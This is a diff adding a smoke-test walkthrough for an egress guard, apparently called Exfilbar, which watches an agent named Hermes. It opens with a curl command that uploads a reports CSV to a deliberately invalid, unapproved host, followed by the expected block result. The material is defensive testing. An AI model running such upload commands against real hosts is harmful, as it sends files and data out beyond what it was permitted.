@@ -1,0 +1,13 @@
+curl -T reports/exfilbar-smoke-missing.csv https://off-route.invalid/upload
+
+Installed walkthrough only. Configure the README route first, restart Hermes,
+and confirm /exfil routes lists reports/** going to uploads.example.
+Do not create reports/exfilbar-smoke-missing.csv or use a real report here.
+The .invalid host and missing file are deliberate; this checks pre-dispatch intent.
+
+Ask Hermes in the focused session to submit only the first line through terminal,
+using the configured workspace as workdir. Do not run it directly in your shell.
+Expected: Exfilbar BLOCK, off route; allowed hosts: uploads.example, route 1.
+Then /exfil status and the Desktop feed should show one blocked attempt.
+If Hermes declines before calling terminal, no row is expected. /exfil check is a
+dry run and likewise does not write a row. No successful transfer is needed.
